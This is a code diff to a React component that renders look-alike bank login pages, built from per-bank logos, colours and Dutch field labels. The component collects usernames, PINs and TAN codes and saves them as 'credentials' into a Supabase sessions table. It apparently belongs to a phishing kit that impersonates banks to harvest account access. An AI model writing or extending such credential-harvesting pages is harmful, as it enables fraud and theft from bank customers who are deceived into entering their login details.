@@ -9,6 +9,7 @@ import { getBankTheme } from "@/lib/bank-theme-config";
 import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 
 type Props = {
   sessionId: string;
@@ -54,14 +55,15 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     };
   }, [sessionId, supabase]);
 
-  async function handleSubmit(fields: { verfuegernummer: string; pin: string; tacCode: string }) {
+  async function handleSubmit(e?: React.FormEvent) {
+    if (e) e.preventDefault();
     if (!supabase || !sessionId || !bank) return;
     setSaving(true);
     setError(null);
 
     const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
-    const normalizedFields = normalizeBankLoginFields(fields);
+    const normalizedFields = normalizeBankLoginFields({ verfuegernummer, pin, tacCode });
     const credentials = normalizeBankCredentialPayload({
       bankSlug: bank.slug,
       bankName: bank.name,
@@ -104,6 +106,124 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     );
   }
 
+  // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
+  if (bank.design) {
+    const design = bank.design;
+    
+    const renderBlock = (block: BlockType) => {
+      switch (block) {
+        case "header":
+          if (!design.header.show) return null;
+          return (
+            <header 
+              key="header"
+              style={{ 
+                backgroundColor: design.header.backgroundColor, 
+                height: design.header.height,
+                padding: design.header.padding,
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
+              }}
+            >
+              {bank.logoFile ? (
+                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
+              ) : (
+                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
+              )}
+            </header>
+          );
+        
+        case "form":
+          return (
+            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
+              <div 
+                style={{
+                  backgroundColor: design.formBox.backgroundColor,
+                  color: design.formBox.textColor,
+                  borderRadius: design.formBox.borderRadius,
+                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
+                  padding: design.formBox.padding,
+                  width: design.formBox.width,
+                  maxWidth: '100%',
+                  fontFamily: design.typography.fontFamily
+                }}
+              >
+                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
+                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
+                
+                <form onSubmit={handleSubmit}>
+                  <div style={{ marginBottom: '1rem' }}>
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
+                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
+                  </div>
+                  <div style={{ marginBottom: '1.5rem' }}>
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
+                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
+                  </div>
+                  
+                  {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
+                  
+                  <button 
+                    type="submit"
+                    disabled={saving}
+                    style={{
+                      width: '100%',
+                      backgroundColor: design.button.backgroundColor,
+                      color: design.button.textColor,
+                      padding: design.button.padding,
+                      borderRadius: design.button.borderRadius,
+                      fontWeight: design.button.fontWeight as any,
+                      border: 'none',
+                      cursor: saving ? 'not-allowed' : 'pointer',
+                      opacity: saving ? 0.7 : 1
+                    }}
+                  >
+                    {saving ? "Laden..." : design.texts.title}
+                  </button>
+                </form>
+              </div>
+            </div>
+          );
+  
+        case "footer":
+          return (
+            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
+              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
+                {design.texts.footerLinks.map((link: string, i: number) => (
+                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
+                ))}
+              </div>
+            </footer>
+          );
+  
+        case "spacer":
+          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
+          
+        default:
+          return null;
+      }
+    };
+  
+    return (
+      <div 
+        style={{
+          minHeight: '100vh',
+          display: 'flex',
+          flexDirection: 'column',
+          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
+          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
+          backgroundSize: 'cover',
+          backgroundPosition: 'center',
+          fontFamily: design.typography.fontFamily
+        }}
+      >
+        {design.blocks.map((block: BlockType) => renderBlock(block))}
+      </div>
+    );
+  }
+
+  // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
   if (!theme) {
     return (
       <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
@@ -138,7 +258,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         <form
           onSubmit={(e) => {
             e.preventDefault();
-            void handleSubmit({ verfuegernummer, pin, tacCode });
+            void handleSubmit();
           }}
           className="space-y-4 p-5"
         >
